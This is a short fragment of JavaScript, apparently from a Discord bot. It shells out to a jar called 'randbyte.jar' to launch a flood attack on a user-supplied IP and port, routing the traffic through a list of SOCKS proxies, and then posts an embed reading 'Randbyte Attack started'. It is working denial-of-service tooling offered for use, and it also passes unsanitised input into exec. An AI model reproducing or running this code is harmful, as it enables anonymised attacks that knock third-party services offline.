...
exec(`start cmd.exe /K java -jar jarfiles/randbyte.jar ${ip}:${port} 2 10000 1 socks_proxies.txt 4`, (error, stdout, stderr) => {
});
const embed = new Discord.MessageEmbed()
      .setColor("EEFF00")
	.setTitle('⚡ Thunderye')
	.addField("IP: " +ip+":"+port, "Randbyte Attack started")
	.setFooter('© Thunder - 2021')
	.setImage("https://i.hizliresim.com/ivrg2py.gif")
 message.channel.send(embed);
 console.log("'RANDBYTE' Attack started!")
    } catch (e) {
